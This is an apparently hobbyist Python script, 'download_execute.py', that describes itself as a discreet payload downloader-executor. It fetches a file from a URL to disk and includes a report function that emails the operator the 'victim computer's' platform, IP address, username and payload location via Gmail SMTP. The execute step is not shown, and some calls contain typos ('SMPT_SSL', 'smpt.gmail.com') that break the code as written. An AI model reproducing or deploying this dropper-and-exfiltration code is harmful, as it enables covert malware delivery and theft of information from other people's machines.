"""download_execute.py

Author: Sam Hilliard

Downloads a specified file, then executes it.
Plain and simple.
Does so as discreetly as possible.
"""

import os, subprocess, platform, getpass
import requests, smtplib, ssl, socket

class DeliverPayload:

    def __init__(self, url, email, password, payload_name, path):
        self.url = url
        self.email = email
        self.password = password
        self.payload_name = payload_name
        self.path = path

    # make sure to test!
    def download_file(self):
        r = requests.get(self.url)
        
        with open(self.path, 'wb') as file:
            file.write(r.content)
        file.close()

    # sends an email from yourself to yourself notifying you that
    # the payload had been successfully downloaded and run
    # aslo reports system information of the victim computer
    def report(self, path):
        context = ssl.create_default_context()

        message = """\
            Subject: Download and Execute payload run.

            Payload delivered and executed on {system_info} at {ip}.
            
            Executed payload: {payload_name}
            Payload location: {payload_path}
            Current User: {user}
        """.format(payload_name=self.payload_name, payload_path=path, system_info=platform.platform(), 
                    user=getpass.getuser(), ip=socket.gethostbyname(socket.gethostname()))

        with smtplib.SMPT_SSL('smpt.gmail.com', 465, context=context) as server:
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)